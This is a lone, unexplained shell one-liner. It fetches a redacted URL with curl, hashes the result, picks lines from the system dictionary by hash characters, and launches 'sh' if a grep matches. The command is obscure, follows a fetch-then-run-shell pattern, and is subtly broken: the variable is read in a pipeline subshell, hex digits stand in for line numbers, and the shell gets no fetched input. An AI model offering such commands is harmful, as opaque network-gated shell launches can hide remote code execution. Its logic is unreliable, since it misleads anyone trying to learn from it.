curl -s[URL]|shasum|read h;awk -v a="${h:0:2}" -v b="${h:3:2}" 'NR==a||NR==b{print}' /usr/share/dict/words|grep -q 'word1-word2'&&sh

